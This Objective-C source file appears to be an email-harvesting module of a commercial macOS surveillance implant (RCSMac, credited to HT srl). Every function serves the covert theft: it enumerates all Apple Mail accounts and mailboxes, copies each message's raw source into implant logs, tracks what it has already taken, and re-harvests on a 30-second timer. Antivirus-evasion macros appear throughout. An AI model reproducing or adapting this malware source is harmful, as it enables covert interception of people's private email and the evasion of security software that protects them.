/*
 * RCSMAgentMessages.m
 * RCSMac 
 * Messages Agent
 *
 *
 * Created by J on 06/03/2014
 *
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

#import "RCSMAgentMessages.h"
#import "RCSNativeMail.h"
#import "RCSMCommon.h"
#import "RCSMTaskManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"


static __m_MAgentMessages *sharedAgentMessages = nil;

@interface __m_MAgentMessages (private)


- (void) _writeLog:(mailMessage*)msg;
- (void) _getMail;
- (NSData*)createLogHeaderWithSize:(NSInteger)logSize fromMessage:(mailMessage *)msg;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentMessages (private)

- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 100];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}

- (NSData*)createLogHeaderWithSize:(NSInteger)logSize
                       fromMessage:(mailMessage*) msg
{
    NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(messagesAdditionalHeader)];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    messagesAdditionalHeader *additionalHeader = (messagesAdditionalHeader *)[logHeader bytes];;
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    additionalHeader->size    = logSize;
    additionalHeader->version = MAIL_VERSION2; //MAPI_V2_0_PROTO;
    additionalHeader->flags  = MAIL_FULL_BODY;
    NSString *from = [msg sender];
    if(from != nil)
    {
        if ([from rangeOfString:inAddr options:NSCaseInsensitiveSearch].location == NSNotFound)
        {
            // sender it's not me, it's a incoming message
            additionalHeader->flags |= MAIL_INCOMING;
        }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    NSDate *now = [NSDate date];
    NSTimeInterval unixTime = [now timeIntervalSince1970];
    int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;
    additionalHeader->lowDatetime = winTime & 0xFFFFFFFF;
    additionalHeader->highDatetime = (winTime >> 32) & 0xFFFFFFFF;
    additionalHeader->program = PROGRAM_MAIL;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return [logHeader autorelease];
}


- (void) _writeLog: (mailMessage*) msg
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    
    NSString *rawMail = msg.source;
    NSMutableData *contentData = [NSMutableData dataWithData:[rawMail dataUsingEncoding:NSUTF8StringEncoding ]];
    
    NSData *additionalHeaderData = [self createLogHeaderWithSize:[contentData length] fromMessage:msg ];
    
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: AGENT_MESSAGES
                             agentHeader: additionalHeaderData
                               withLogID: 0];
    
    if (success)
    {
    
        [logManager writeDataToLog: contentData
                          forAgent: AGENT_MESSAGES
                         withLogID: 0];
        // AV evasion: only on release build
        AV_GARBAGE_001
    
        [logManager closeActiveLog: AGENT_MESSAGES
                     withLogID: 0];
    
        // AV evasion: only on release build
        AV_GARBAGE_004

    }
    
    [pool release];
    return;
}

- (void) _getMail
{
    mailApplication *appleMail =[SBApplication applicationWithBundleIdentifier:@"com.apple.mail"];
    
    if ([appleMail isRunning])
    {
        // accounts
        mailAccount *accounts = [appleMail accounts];
        for (mailAccount *account in accounts)
        {
            // retrieve mail addr associated to the account
            NSArray *mailAddrs = [account emailAddresses];
            inAddr = [mailAddrs objectAtIndex:0];
            
            // mailboxes
            mailMailbox *mailboxes = [account mailboxes];
            for (mailMailbox *mbox in mailboxes)
            {
                //messages
                mailMessage *msgs = [mbox messages];
                for (mailMessage *msg in msgs)
                {
                    // check if agent has been stopped
                    if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
                       || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
                    {
                        // save markup and return
                        [self _setMarkup];
                        return;
                    }
                    else
                    {
                        // verify date range
                        NSDate *mailDate = msg.dateReceived;
                        if (([mailDate compare:dateFrom] == NSOrderedDescending) && ([mailDate compare:dateTo] == NSOrderedAscending))
                            //mailDate later than dateFrom and earlier then dateTo
                        {
                            // verify size range
                            if(msg.messageSize <= size)
                            {
                                // verify markup
                                NSNumber *key = [NSNumber numberWithInteger:msg.id];
                                NSString *msgId = msg.messageId;
                                NSString *obj=[markup objectForKey:key];
                                if(obj == nil)
                                {
#ifdef DEBUG_MESSAGES
                                    infoLog(@"no msgId in markup");
#endif
                                    // there's no markup
                                    [markup setObject:msgId forKey:key];
                                    [self _writeLog:msg];
                                }
                                else
                                {
#ifdef DEBUG_MESSAGES
                                    infoLog(@"msgId in markup");
#endif
                                    // there's a markup, if same msg id we do nothing
                                    // else, id has been recycled and we have to log
                                    // the msg and save markup
                                    if ([obj isEqualToString:msgId] == NO)
                                    {
                                        [markup setObject:msgId forKey:key];
                                        [self _writeLog:msg];
                                    } // else we do nothing
                                }
                            }
                        }
                    }
                }
            }
        }
        // write markup to file at the end of the big loop
        [self _setMarkup];
    }
}

@end


@implementation __m_MAgentMessages

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentMessages *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentMessages == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentMessages;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentMessages == nil)
        {
            sharedAgentMessages = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentMessages;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
#ifdef DEBUG_MESSAGES
    infoLog(@"dentro stop agent messages.");
#endif

    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
    NSTimer *timer = nil;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    // read config data
    NSMutableDictionary *data = [mConfiguration objectForKey: @"data"];
    NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
    NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
    [inFormat setTimeZone:timeZone];
    [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
    dateTo = [inFormat dateFromString: [data objectForKey: @"dateto"]];
    dateFrom = [inFormat dateFromString: [data objectForKey: @"datefrom"]];
    [inFormat release];
    size = [[data objectForKey:@"maxsize"] integerValue];

    // read markup data
    [self _getMarkup];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    // start the first run of email grabbing
    [self _getMail];
    
    //TODO: ricordarsi di cambiare l'intervallo del timer a 600
    if (gOSMajor == 10 && gOSMinor >= 7)
    {
        timer = [NSTimer scheduledTimerWithTimeInterval:30.0 /*600*/ target:self selector:@selector(_getMail) userInfo:nil repeats:YES];
        [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
    }
    else
    {
        // TODO: decide what to do here
        
    }
    
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
    
    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 7)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    if (gOSMajor == 10 && gOSMinor >= 7)
    {
        if (timer != nil)
            [timer invalidate];
    }
    else
    {
        // Remove our observer
        //[[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [outerPool release]; 
}


- (BOOL)resume
{
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
